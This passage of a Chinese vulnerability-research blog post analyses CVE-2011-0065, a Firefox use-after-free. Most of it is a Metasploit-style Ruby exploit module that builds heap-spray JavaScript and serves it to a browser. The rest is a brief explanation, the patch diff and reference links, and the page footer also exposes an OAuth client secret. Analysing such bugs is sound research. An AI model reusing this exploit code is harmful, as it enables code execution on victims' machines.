we dont get the &#x27;unresponsive script&#x27; warning from ff</span></span><br><span class="line">        <span class="comment"># precision heap spray</span></span><br><span class="line">        custom_js = <span class="string">&lt;&lt;-JS</span></span><br><span class="line"><span class="string">        <span class="subst">#&#123;js_element_name&#125;</span> = document.getElementById(&quot;d&quot;);</span></span><br><span class="line"><span class="string">        <span class="subst">#&#123;js_element_name&#125;</span>.QueryInterface(Components.interfaces.nsIChannelEventSink).onChannelRedirect(null,new Object,0)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        <span class="subst">#&#123;js_obj_addr_name&#125;</span> = unescape(&quot;\x00<span class="subst">#&#123;fakevtable&#125;</span>&quot;);</span></span><br><span class="line"><span class="string">        var <span class="subst">#&#123;js_sc_name&#125;</span> = unescape(&quot;<span class="subst">#&#123;escaped_payload&#125;</span>&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        var <span class="subst">#&#123;js_ret_addr_name&#125;</span> = unescape(&quot;<span class="subst">#&#123;fakefunc&#125;</span>&quot;);</span></span><br><span class="line"><span class="string">        var <span class="subst">#&#123;js_retns&#125;</span> = unescape(&quot;<span class="subst">#&#123;retns&#125;</span>&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        <span class="subst">#&#123;js_ret_addr_name&#125;</span> += <span class="subst">#&#123;js_retns&#125;</span>;</span></span><br><span class="line"><span class="string">        <span class="subst">#&#123;js_ret_addr_name&#125;</span> += <span class="subst">#&#123;js_retns&#125;</span>;</span></span><br><span class="line"><span class="string">        <span class="subst">#&#123;js_ret_addr_name&#125;</span> += <span class="subst">#&#123;js_retns&#125;</span>;</span></span><br><span class="line"><span class="string">        <span class="subst">#&#123;js_ret_addr_name&#125;</span> += <span class="subst">#&#123;js_retns&#125;</span>;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        var <span class="subst">#&#123;js_ppppr&#125;</span> = unescape(&quot;<span class="subst">#&#123;ppppr&#125;</span>&quot;);</span></span><br><span class="line"><span class="string">        <span class="subst">#&#123;js_ret_addr_name&#125;</span> += <span class="subst">#&#123;js_ppppr&#125;</span>;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        var <span class="subst">#&#123;js_filler&#125;</span> = unescape(&quot;%u4344%u4142&quot;);</span></span><br><span class="line"><span class="string">        while(<span class="subst">#&#123;js_filler&#125;</span>.length &lt; 0x201) &#123;<span class="subst">#&#123;js_filler&#125;</span> += <span class="subst">#&#123;js_filler&#125;</span>;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        while(<span class="subst">#&#123;js_ret_addr_name&#125;</span>.length &lt; 0x80) &#123;<span class="subst">#&#123;js_ret_addr_name&#125;</span> += <span class="subst">#&#123;js_ret_addr_name&#125;</span>;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        var <span class="subst">#&#123;js_chunk_name&#125;</span> = <span class="subst">#&#123;js_ret_addr_name&#125;</span>.substring(0,0x18/2);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        <span class="subst">#&#123;js_chunk_name&#125;</span> += <span class="subst">#&#123;js_sc_name&#125;</span>;</span></span><br><span class="line"><span class="string">        <span class="subst">#&#123;js_chunk_name&#125;</span> += <span class="subst">#&#123;js_filler&#125;</span>;</span></span><br><span class="line"><span class="string">        <span class="subst">#&#123;js_chunk_name&#125;</span> += <span class="subst">#&#123;js_ret_addr_name&#125;</span>;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        var <span class="subst">#&#123;js_final_chunk_name&#125;</span> = <span class="subst">#&#123;js_chunk_name&#125;</span>.substring(0,0x10000/2);</span></span><br><span class="line"><span class="string">        while (<span class="subst">#&#123;js_final_chunk_name&#125;</span>.length&lt;0x800000) &#123;<span class="subst">#&#123;js_final_chunk_name&#125;</span> += <span class="subst">#&#123;js_final_chunk_name&#125;</span>;&#125;</span></span><br><span class="line"><span class="string">        var <span class="subst">#&#123;js_block_name&#125;</span> = <span class="subst">#&#123;js_final_chunk_name&#125;</span>.substring(0,0x80000 - <span class="subst">#&#123;js_sc_name&#125;</span>.length - 0x24/2 - 0x4/2 - 0x2/2);</span></span><br><span class="line"><span class="string">        <span class="subst">#&#123;js_array_name&#125;</span> = new Array()</span></span><br><span class="line"><span class="string">        for (n=0;n&lt;0x80;n++)&#123;</span></span><br><span class="line"><span class="string">          <span class="subst">#&#123;js_array_name&#125;</span>[n] = <span class="subst">#&#123;js_block_name&#125;</span> + <span class="subst">#&#123;js_sc_name&#125;</span>;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        JS</span></span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    html = <span class="string">&lt;&lt;-HTML</span></span><br><span class="line"><span class="string">    &lt;html&gt;</span></span><br><span class="line"><span class="string">    &lt;body&gt;</span></span><br><span class="line"><span class="string">      &lt;object id=&quot;d&quot;&gt;&lt;object&gt;</span></span><br><span class="line"><span class="string">      &lt;applet code=&quot;<span class="subst">#&#123;js_applet_name&#125;</span>.class&quot; width=0 height=0&gt;&lt;/applet&gt;</span></span><br><span class="line"><span class="string">      &lt;script type=&quot;text/javascript&quot;&gt;</span></span><br><span class="line"><span class="string">      <span class="subst">#&#123;custom_js&#125;</span></span></span><br><span class="line"><span class="string">      &lt;/script&gt;</span></span><br><span class="line"><span class="string">    &lt;/body&gt;</span></span><br><span class="line"><span class="string">    &lt;/html&gt;</span></span><br><span class="line"><span class="string">    HTML</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#Remove the extra tabs</span></span><br><span class="line">    html = html.gsub(<span class="regexp">/^ &#123;4&#125;/</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    print_status(<span class="string">&quot;Sending HTML...&quot;</span>)</span><br><span class="line">    send_response_html(cli, html, &#123; <span class="string">&#x27;Content-Type&#x27;</span> =&gt; <span class="string">&#x27;text/html&#x27;</span> &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Handle the payload</span></span><br><span class="line">    handler(cli)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></div><p>注意到 exp 创建了一个 Object，并调用了 <code>onChannelRedirect</code> 函数，其第二个参数为 new Object，这将使得 mChannel 变为悬挂指针。exp 随后申请了一块大小相同的内存对象以填充虚表指针。最后 exp 将 shellcode 堆喷射到了 UAF 时调用的虚函数位置，实现了任意代码执行</p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">--- a/content/base/src/nsObjectLoadingContent.cpp</span><br><span class="line">+++ b/content/base/src/nsObjectLoadingContent.cpp</span><br><span class="line">@@ <span class="number">-1010</span>,<span class="number">18</span> <span class="number">+1010</span>,<span class="number">19</span> @@ nsObjectLoadingContent::<span class="built_in">GetInterface</span>(con</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">// nsIChannelEventSink</span></span><br><span class="line"> NS_IMETHODIMP</span><br><span class="line"> nsObjectLoadingContent::<span class="built_in">OnChannelRedirect</span>(nsIChannel *aOldChannel,</span><br><span class="line">                                           nsIChannel *aNewChannel,</span><br><span class="line">                                           PRUint32    aFlags)</span><br><span class="line"> &#123;</span><br><span class="line">-  <span class="comment">// If we&#x27;re already busy with a new load, cancel the redirect</span></span><br><span class="line">-  <span class="keyword">if</span> (aOldChannel != mChannel) &#123;</span><br><span class="line">+  <span class="comment">// If we&#x27;re already busy with a new load, or have no load at all,</span></span><br><span class="line">+  <span class="comment">// cancel the redirect.</span></span><br><span class="line">+  <span class="keyword">if</span> (!mChannel || aOldChannel != mChannel) &#123;</span><br><span class="line">     <span class="keyword">return</span> NS_BINDING_ABORTED;</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">if</span> (mClassifier) &#123;</span><br><span class="line">     mClassifier-&gt;<span class="built_in">OnRedirect</span>(aOldChannel, aNewChannel);</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   mChannel = aNewChannel;</span><br></pre></td></tr></table></figure></div><p>补丁添加了对 mChannel 对象的判断，若对象已被释放则直接返回，不再引用</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a class="link" target="_blank" rel="noopener external nofollow noreferrer" href="https://hg-edge.mozilla.org/releases/mozilla-1.9.2/file/c24f21581d77/content/base/src/nsObjectLoadingContent.cpp">Vulnerable source code<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><a class="link" target="_blank" rel="noopener external nofollow noreferrer" href="https://bugzilla.mozilla.org/show_bug.cgi?id=634986">Bugzilla - CVE-2011-0065<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><a class="link" target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/advisories/GHSA-j27m-p5vq-3f4g">Github - CVE-2011-0065<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><a class="link" target="_blank" rel="noopener external nofollow noreferrer" href="https://nvd.nist.gov/vuln/detail/CVE-2011-0065">NVD - CVE-2011-0065<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><a class="link" target="_blank" rel="noopener external nofollow noreferrer" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-0065">CVE - CVE-2011-0065<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><a class="link" target="_blank" rel="noopener external nofollow noreferrer" href="https://book.douban.com/subject/26830238/">漏洞战争<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p></div><div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8"><div class="article-copyright-info-container"><ul><li><strong>Title:</strong> CVE-2011-0065 Investigation</li><li><strong>Author:</strong> 7erry</li><li><strong>Created at :</strong> 2025-03-03 18:53:57</li><li><strong>Updated at :</strong> 2025-03-03 18:53:57</li><li><strong>Link:</strong> https://7erryx.github.io/2025/03/03/Vulnerability Investigation/CVE-2011-0065-Investigation/</li><li><strong>License: </strong>This work is licensed under <a class="license" target="_blank" rel="noopener external nofollow noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.</li></ul></div></div><div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8"><div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2"><a class="prev" rel="prev" href="/2025/03/15/Vulnerability%20Investigation/CVE-2013-1347-Investigation/"><span class="left arrow-icon flex justify-center items-center"><i class="fa-solid fa-chevron-left"></i> </span><span class="title flex justify-center items-center"><span class="post-nav-title-item truncate max-w-48">CVE-2013-1347 Investigation</span> <span class="post-nav-item">Prev posts</span></span></a></div><div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2"><a class="next" rel="next" href="/2025/02/22/Vulnerability%20Investigation/CVE-2014-0502-Investigation/"><span class="title flex justify-center items-center"><span class="post-nav-title-item truncate max-w-48">CVE-2014-0502 Investigation</span> <span class="post-nav-item">Next posts</span> </span><span class="right arrow-icon flex justify-center items-center"><i class="fa-solid fa-chevron-right"></i></span></a></div></div><div class="comment-container px-2 sm:px-6 md:px-8 pb-8"><div class="comments-container mt-10 w-full"><div id="comment-anchor" class="w-full h-2.5"></div><div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">Comments</div><div id="gitalk-container"></div><script data-swup-reload-script src="https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.8.0/gitalk.min.js"></script><script data-swup-reload-script>function loadGitalk(){let e=decodeURI(location.pathname);e.length>50&&(e=e.substring(0,47)+"...");try{Gitalk&&new Gitalk({clientID:"Ov23libH3Xd9PxVu3LCR",clientSecret:"94e9555f77e9a3f938f8cf232d497375d8cc156f",repo:"7erryX.github.io",owner:"7erryX",admin:["7erryX"],id:e,language:"en, zh-CN",proxy:"https://github.com/login/oauth/access_token"}).render("gitalk-container")}catch(e){window.Gitalk=null}}{const e=setTimeout(()=>{loadGitalk(),clearTimeout(e)},1e3)}</script></div></div></div><div class="toc-content-container"><div class="post-toc-wrap"><div class="post-toc"><div class="toc-title">On this page</div><div class="page-title">CVE-2011-0065 Investigation</div><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit-%E5%88%86%E6%9E%90"><span class="nav-text">Exploit 分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="nav-text">漏洞修复</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reference"><span class="nav-text">Reference</span></a></li></ol></div></div></div></div></div></div><div class="main-content-footer"><footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color"><div class="info-container py-3 text-center"><div class="text-center">&copy; <span>2020</span> - 2026&nbsp;&nbsp;<i class="fa-regular fa-computer-classic"></i>&nbsp;&nbsp;<a href="/">7erry</a><p class="post-count space-x-0.5"><span>83 posts in total </span><span>227.2k words in total</span></p></div><script data-swup-reload-script src="https://cn.vercount.one/js"></script><div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right"><span id="busuanzi_container_site_uv" class="lg:!block"><span class="text-sm">VISITOR COUNT</span> <span id="busuanzi_value_site_uv"></span> </span><span id="busuanzi_container_site_pv" class="lg:!block"><span class="text-sm">TOTAL PAGE VIEWS</span> <span id="busuanzi_value_site_pv"></span></span></div><div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left"><span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io" rel="external nofollow noreferrer">Hexo</a></span> <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine" rel="external nofollow noreferrer">Redefine v2.8.5</a></span></div><div>Blog up for <span class="odometer" id="runtime_days"></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec</div><script data-swup-reload-script>try{function odometer_init(){document.querySelectorAll(".odometer").forEach(e=>{new Odometer({el:e,format:"( ddd).dd",duration:200})})}odometer_init()}catch(e){}</script></div></footer></div></div><div class="post-tools"><div class="post-tools-container"><ul class="article-tools-list"><li class="right-bottom-tools page-aside-toggle"><i class="fa-regular fa-outdent"></i></li><li class="go-comment"><i class="fa-regular fa-comments"></i></li></ul></div></div><div class="right-side-tools-container"><div class="side-tools-container"><ul class="hidden-tools-list"><li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center"><i class="fa-regular fa-magnifying-glass-plus"></i></li><li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center"><i class="fa-regular fa-magnifying-glass-minus"></i></li><li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center"><i class="fa-regular fa-moon"></i></li><li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center"><i class="fa-regular fa-arrow-down"></i></li></ul><ul class="visible-tools-list"><li class="right-bottom-tools toggle-tools-list flex justify-center items-center"><i class="fa-regular fa-cog fa-spin"></i></li><li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center"><i class="arrow-up fas fa-arrow-up"></i> <span class="percent"></span></li></ul></div></div><div class="image-viewer-container"><img src=""></div><div class="search-pop-overlay"><div class="popup search-popup"><div class="search-header"><span class="search-input-field-pre"><i class="fa-solid fa-keyboard"></i></span><div class="search-input-container"><input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input"></div><span class="popup-btn-close"><i class="fa-solid fa-times"></i></span></div><div id="search-result"><div id="no-result"><i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i></div></div></div></div></main><script src="/js/build/libs/Swup.min.js"></script><script src="/js/build/libs/SwupSlideTheme.min.js"></script><script src="/js/build/libs/SwupScriptsPlugin.min.js"></script><script src="/js/build/libs/SwupProgressPlugin.min.js"></script><script src="/js/build/libs/SwupScrollPlugin.min.js"></script><script src="/js/build/libs/SwupPreloadPlugin.min.js"></script><script>const swup=new Swup({plugins:[new SwupScriptsPlugin({optin:!0}),new SwupProgressPlugin,new SwupScrollPlugin({offset:80}),new SwupSlideTheme({mainElement:".main-content-body"}),new SwupPreloadPlugin],containers:["#swup"]})</script><script src="/js/build/tools/imageViewer.js" type="module"></script><script src="/js/build/utils.js" type="module"></script><script src="/js/build/main.js" type="module"></script><script src="/js/build/layouts/navbarShrink.js" type="module"></script><script src="/js/build/tools/scrollTopBottom.js" type="module"></script><script src="/js/build/tools/lightDarkSwitch.js" type="module"></script><script src="/js/build/layouts/categoryList.js" type="module"></script><script src="/js/build/tools/localSearch.js" type="module"></script><script src="/js/build/tools/codeBlock.js" type="module"></script><script src="/js/build/layouts/lazyload.js" type="module"></script><script src="/js/build/tools/runtime.js"></script><script src="/js/build/libs/odometer.min.js"></script><link rel="stylesheet" href="/assets/odometer-theme-minimal.css"><script src="/js/build/libs/Typed.min.js"></script><script src="/js/build/plugins/typed.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/mermaid@9.3.0/dist/mermaid.min.js"></script><script src="/js/build/plugins/mermaid.js"></script><script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script><script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script><script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script><script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script><script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script></body></html>